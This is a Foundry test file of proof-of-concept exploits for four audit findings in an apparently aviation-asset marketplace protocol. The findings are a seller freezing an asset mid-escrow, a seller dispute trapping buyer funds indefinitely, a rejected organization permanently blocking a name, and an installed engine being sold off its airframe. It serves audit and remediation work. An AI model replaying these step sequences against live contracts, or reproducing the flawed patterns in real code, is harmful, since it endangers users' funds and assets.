// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IAssetRegistry} from "../../src/interfaces/IAssetRegistry.sol";
import {IComponentRegistry} from "../../src/interfaces/IComponentRegistry.sol";
import {IEscrow} from "../../src/interfaces/IEscrow.sol";
import {IOrganizationRegistry} from "../../src/interfaces/IOrganizationRegistry.sol";
import {ProtocolTestBase} from "../utils/ProtocolTestBase.sol";

/// @title AuditPoC
/// @notice Executable proof-of-concept for audit findings AAP-01, AAP-02, AAP-05 and
///         AAP-06.
/// @dev Deliberately kept OUT of `test/` so it does not run in CI — these tests pass
///      **because the protocol is vulnerable**, and each must start failing once its
///      finding is remediated. To run:
///
///      ```
///      cp audit/poc/AuditPoC.t.sol test/audit/AuditPoC.t.sol
///      forge test --match-path 'test/audit/AuditPoC.t.sol' -vv
///      ```
///
///      **Status.** All four passed at commit `b31b6d2`. After the Gate 0 remediation:
///
///      | Test | Finding | Gate | Post-fix |
///      |---|---|---|---|
///      | `SellerCanBrickAssetMidEscrow` | AAP-02 | 0 | **FAILS** — attack blocked |
///      | `DisputeTrapsFunds` | AAP-01 | 0 | still passes — see below |
///      | `RejectedOrgPermanentlyBurnsTheName` | AAP-05 | 1 | still passes — not yet fixed |
///      | `InstalledComponentCanBeSoldOffTheAirframe` | AAP-06 | 1 | still passes — not yet fixed |
///
///      **`DisputeTrapsFunds` still passing is not evidence AAP-01 survived.** It
///      enumerates the exits that existed when it was written and cannot call the one
///      the fix added. A PoC is only a forward oracle when remediation *closes* a path
///      it exercises, not when remediation *opens* a new one. The oracle for AAP-01 is
///      the regression suite.
///
///      The regression tests live in `test/audit/Gate0Regression.t.sol` and run in CI.
contract AuditPoC is ProtocolTestBase {
    uint128 internal constant PRICE = 1_000_000e6;

    /// @notice AAP-02: seller bricks the asset mid-escrow and strands buyer funds.
    function test_PoC_SellerCanBrickAssetMidEscrow() public {
        (uint256 assetId,, address escrowAddr) = _openTrade(PRICE);
        IEscrow escrow = IEscrow(escrowAddr);

        _fundBuyer(bob, escrowAddr, PRICE);
        vm.prank(bob);
        escrow.fund();

        assertEq(uint8(escrow.status()), uint8(IEscrow.EscrowStatus.FUNDED), "not funded");
        assertFalse(assetOwnership.isTransferable(assetId), "should be locked");

        // Seller still owns the asset and can unilaterally mark it DESTROYED.
        vm.prank(alice);
        assetRegistry.setAssetStatus(assetId, IAssetRegistry.AssetStatus.DESTROYED);

        // Buyer can now never take delivery.
        vm.prank(bob);
        vm.expectRevert();
        escrow.release();

        // Funds are only recoverable after the full settlement window.
        vm.warp(block.timestamp + 31 days);
        escrow.claimTimeout();
        assertEq(uint8(escrow.status()), uint8(IEscrow.EscrowStatus.REFUNDED), "no refund");

        // The asset is permanently frozen. No role, including the protocol admin,
        // can reverse it: there is no unfreeze entry point anywhere in the protocol.
        assertFalse(assetOwnership.isTransferable(assetId), "asset should be permanently frozen");
        assertTrue(assetOwnership.getOwnership(assetId).transferFrozen, "freeze flag not set");
    }

    /// @notice AAP-01: a seller-raised dispute freezes buyer funds with no deadline.
    /// @dev **This test is not a forward oracle, and still passes post-fix.** It
    ///      enumerates the exits that existed at `b31b6d2` — `claimTimeout`, `release`,
    ///      `cancel` — and proves all three are closed. The remediation did not reopen
    ///      any of them; it added a fourth (`claimDisputeTimeout`) that this test cannot
    ///      call, because it did not exist when the test was written.
    ///
    ///      Kept unchanged as the historical record of the vulnerability. The oracle for
    ///      AAP-01 is `test_AAP01_DisputeCannotFreezeFundsForever` in
    ///      `test/audit/Gate0Regression.t.sol`, which asserts the new exit works and
    ///      that an abandoned arbitration still refunds.
    function test_PoC_DisputeTrapsFunds() public {
        (,, address escrowAddr) = _openTrade(PRICE);
        IEscrow escrow = IEscrow(escrowAddr);

        _fundBuyer(bob, escrowAddr, PRICE);
        vm.prank(bob);
        escrow.fund();

        // The SELLER raises the dispute, immediately, at no cost.
        vm.prank(alice);
        escrow.raiseDispute();
        assertEq(uint8(escrow.status()), uint8(IEscrow.EscrowStatus.DISPUTED), "not disputed");

        // Ten years later, with no arbitrator action, every exit is still closed.
        vm.warp(block.timestamp + 3650 days);

        vm.expectRevert();
        escrow.claimTimeout();

        vm.prank(bob);
        vm.expectRevert();
        escrow.release();

        vm.prank(bob);
        vm.expectRevert();
        escrow.cancel();

        assertEq(settlementToken.balanceOf(escrowAddr), PRICE, "funds not trapped in escrow");
        assertEq(uint8(escrow.status()), uint8(IEscrow.EscrowStatus.DISPUTED), "still stuck in DISPUTED");
    }

    /// @notice AAP-05: rejecting a squatted organization does not free its name.
    function test_PoC_RejectedOrgPermanentlyBurnsTheName() public {
        bytes32 nameHash = keccak256("Lufthansa Technik AG");

        // Squatter registers the name first.
        vm.prank(bob);
        uint256 squatId = orgRegistry.registerOrganization(
            IOrganizationRegistry.OrganizationType.MRO, nameHash, keccak256("junk"), "ipfs://junk"
        );

        // The verifier rejects it, which docs describe as the mitigation.
        vm.prank(orgVerifier);
        orgRegistry.rejectOrganization(squatId);

        // The name index was never cleared: the real party can never register it.
        assertEq(orgRegistry.organizationIdByNameHash(nameHash), squatId, "index cleared");

        vm.prank(alice);
        vm.expectRevert(
            abi.encodeWithSelector(IOrganizationRegistry.OrganizationNameTaken.selector, nameHash, squatId)
        );
        orgRegistry.registerOrganization(
            IOrganizationRegistry.OrganizationType.MRO, nameHash, keccak256("real"), "ipfs://real"
        );
    }

    /// @notice AAP-06: an installed component can be sold away from its airframe.
    function test_PoC_InstalledComponentCanBeSoldOffTheAirframe() public {
        (uint256 orgId, uint256 aircraftId) = _defaultAircraft();

        uint256 engineId =
            _registerComponent(orgId, alice, alice, IComponentRegistry.ComponentKind.ENGINE, keccak256("ESN-1"));

        vm.prank(alice);
        componentRegistry.installComponent(engineId, aircraftId, 1);
        assertEq(componentRegistry.getComponent(engineId).parentAssetId, aircraftId, "not installed");

        // The engine is now fitted. Nothing stops it being listed and sold.
        vm.prank(orgVerifier);
        assetRegistry.verifyAsset(engineId, orgId);

        vm.prank(alice);
        uint256 listingId = marketplace.createListing(
            engineId, address(settlementToken), PRICE, uint40(block.timestamp + 30 days)
        );

        vm.prank(bob);
        uint256 offerId = marketplace.makeOffer(listingId, PRICE, uint40(block.timestamp + 7 days));
        vm.prank(alice);
        (, address escrowAddr) = marketplace.acceptOffer(offerId);

        _fundBuyer(bob, escrowAddr, PRICE);
        vm.prank(bob);
        IEscrow(escrowAddr).fund();
        vm.prank(bob);
        IEscrow(escrowAddr).release();

        // Bob owns an engine that the registry still reports as fitted to alice's aircraft.
        assertEq(assetOwnership.ownerOf(engineId), bob, "engine not sold");
        assertEq(assetOwnership.ownerOf(aircraftId), alice, "aircraft moved");
        assertEq(componentRegistry.getComponent(engineId).parentAssetId, aircraftId, "still installed elsewhere");
        assertEq(componentRegistry.componentCountOf(aircraftId), 1, "still indexed on the airframe");
    }
}
